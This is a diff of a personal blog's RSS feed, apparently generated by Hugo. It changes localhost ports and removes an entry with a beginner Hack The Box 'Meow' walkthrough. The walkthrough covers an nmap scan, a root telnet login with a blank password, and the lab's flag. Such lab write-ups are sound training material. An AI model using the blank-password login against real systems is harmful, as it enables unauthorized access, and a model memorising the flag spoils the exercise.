-      <link>http://localhost:1313/htb-dancing/</link>
+      <link>http://localhost:49865/htb-dancing/</link>
       <pubDate>Mon, 17 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/htb-dancing/</guid>
+      <guid>http://localhost:49865/htb-dancing/</guid>
       <description>Hack The Box starting point, tier 0, very easy, #3 machine: Dancing. Lets&amp;rsquo; go!
 TASK 1 What does 3-letter acronym SMB stand for?
 Server Message Block SMB protocol implements an application-layer network protocol used to access resources on a server, such as file shares and shared printers.
@@ -9053,9 +9247,9 @@ Port 445: Later versions of SMB (after Windows 2000) began to use port 445 on to
     </item>
     <item>
       <title>[HTB] Fawn</title>
-      <link>http://localhost:1313/htb-fawn/</link>
+      <link>http://localhost:49865/htb-fawn/</link>
       <pubDate>Mon, 17 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/htb-fawn/</guid>
+      <guid>http://localhost:49865/htb-fawn/</guid>
       <description>Hopefully one day I will become very good at CTFs.
 TASK 1 What does the 3-letter acronym FTP stand for?
 File Transfer Protocol TASK 2 Which port does the FTP service listen on usually?
@@ -9292,181 +9486,6 @@ TASK 4 What is the command we can use to send an ICMP echo request to test our c
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.27<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-psvucohdrg<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">8</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$</span></span></code></pre></div>
 <p><img src="./fawn.png" alt="fawn_cleared"></p>
-]]></content:encoded>
-    </item>
-    <item>
-      <title>[HTB] Meow</title>
-      <link>http://localhost:1313/htb-meow/</link>
-      <pubDate>Mon, 17 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/htb-meow/</guid>
-      <description>My journey begins here. 🐌
-TASK 1 What does the acronym VM stand for? Virtual Machine TASK 2 What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It&amp;rsquo;s also known as a console or shell.
-Terminal TASK 3 What service do we use to form our VPN connection into HTB labs?</description>
-      <content:encoded><![CDATA[<blockquote>
-<p>My journey begins here. 🐌</p>
-</blockquote>
-<hr>
-<h5 id="task-1">TASK 1</h5>
-<p>What does the acronym VM stand for? </br></p>
-
-
-
-
-
-
-<pre tabindex="0"><code>Virtual Machine</code></pre>
-</br>
-<h5 id="task-2">TASK 2</h5>
-<p>What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It&rsquo;s also known as a console or shell.</p>
-
-
-
-
-
-
-<pre tabindex="0"><code>Terminal</code></pre>
-</br>
-<h5 id="task-3">TASK 3</h5>
-<p>What service do we use to form our VPN connection into HTB labs?</p>
-
-
-
-
-
-
-<pre tabindex="0"><code>openvpn</code></pre>
-</br>
-<h5 id="task-4">TASK 4</h5>
-<p>What tool do we use to test our connection to the target with an ICMP echo request?</p>
-
-
-
-
-
-
-<pre tabindex="0"><code>ping</code></pre>
-</br>
-<h5 id="task-5">TASK 5</h5>
-<p>What is the name of the most common tool for finding open ports on a target?</p>
-
-
-
-
-
-
-<pre tabindex="0"><code>nmap</code></pre>
-</br>
-<h5 id="task-6">TASK 6</h5>
-<p>What service do we identify on port23/tcp during our scans?</p>
-
-
-
-
-
-
-<pre tabindex="0"><code>telnet</code></pre>
-
-
-
-
-
-
-<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.27<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-psvucohdrg<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ nmap -sC -sV 10.129.67.74 -p <span style="color:#fab387">23</span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Starting Nmap 7.93 <span style="color:#89dceb;font-weight:bold">(</span> https://nmap.org <span style="color:#89dceb;font-weight:bold">)</span> at 2024-06-17 05:20 BST
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Nmap scan report <span style="color:#cba6f7">for</span> 10.129.67.74
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Host is up <span style="color:#89dceb;font-weight:bold">(</span>0.0098s latency<span style="color:#89dceb;font-weight:bold">)</span>.
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>PORT   STATE SERVICE VERSION
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>23/tcp open  telnet  Linux telnetd
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>Nmap <span style="color:#cba6f7">done</span>: <span style="color:#fab387">1</span> IP address <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">1</span> host up<span style="color:#89dceb;font-weight:bold">)</span> scanned in 20.48 seconds
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.27<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-psvucohdrg<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$</span></span></code></pre></div>
-</br>
-<h5 id="task-7">TASK 7</h5>
-<p>What username is able to log into target over telnet with a blank password?</p>
-
-
-
-
-
-
-<pre tabindex="0"><code>root</code></pre>
-
-
-
-
-
-
-<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.27<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-psvucohdrg<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ telnet 10.129.67.74
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Trying 10.129.67.74...
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Connected to 10.129.67.74.
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Escape character is <span style="color:#a6e3a1">&#39;^]&#39;</span>.
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>Meow login: root
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>Welcome to Ubuntu 20.04.2 LTS <span style="color:#89dceb;font-weight:bold">(</span>GNU/Linux 5.4.0-77-generic x86_64<span style="color:#89dceb;font-weight:bold">)</span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span> * Documentation:  https://help.ubuntu.com
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span> * Management:     https://landscape.canonical.com
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span> * Support:        https://ubuntu.com/advantage
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>  System information as of Mon <span style="color:#fab387">17</span> Jun <span style="color:#fab387">2024</span> 04:26:46 AM UTC
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>  System load:           0.0
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>  Usage of /:            41.7% of 7.75GB
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>  Memory usage:          4%
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>  Swap usage:            0%
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>  Processes:             <span style="color:#fab387">135</span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>  Users logged in:       <span style="color:#fab387">0</span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>  IPv4 address <span style="color:#cba6f7">for</span> eth0: 10.129.67.74
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">28</span><span>  IPv6 address <span style="color:#cba6f7">for</span> eth0: dead:beef::250:56ff:feb0:4ed1
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">30</span><span> * Super-optimized <span style="color:#cba6f7">for</span> small spaces - <span style="color:#89dceb">read</span> how we shrank the memory
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">31</span><span>   footprint of MicroK8s to make it the smallest full K8s around.
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">32</span><span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">33</span><span>   https://ubuntu.com/blog/microk8s-memory-optimisation
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">34</span><span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">35</span><span><span style="color:#fab387">75</span> updates can be applied immediately.
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">36</span><span><span style="color:#fab387">31</span> of these updates are standard security updates.
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">37</span><span>To see these additional updates run: apt list --upgradable
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">38</span><span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">39</span><span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">40</span><span>The list of available updates is more than a week old.
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">41</span><span>To check <span style="color:#cba6f7">for</span> new updates run: sudo apt update
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">42</span><span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">43</span><span>Last login: Mon Sep  <span style="color:#fab387">6</span> 15:15:23 UTC <span style="color:#fab387">2021</span> from 10.10.14.18 on pts/0
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">44</span><span>root@Meow:~#</span></span></code></pre></div>
-</br>
-<h5 id="submit-flag">SUBMIT FLAG</h5>
-<p>Submit root flag</p>
-
-
-
-
-
-
-<pre tabindex="0"><code>b40abdfe23665f766f9c61ecba8a4c19</code></pre>
-
-
-
-
-
-
-<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>root@Meow:~# ls
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>flag.txt snap
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>root@Meow:~# cat flag.txt
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>b40abdfe23665f766f9c61ecba8a4c19
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>root@Meow:~#</span></span></code></pre></div>
-<p><img src="./htb_meow.png" alt="meow_clear"></p>
 ]]></content:encoded>
     </item>
   </channel>
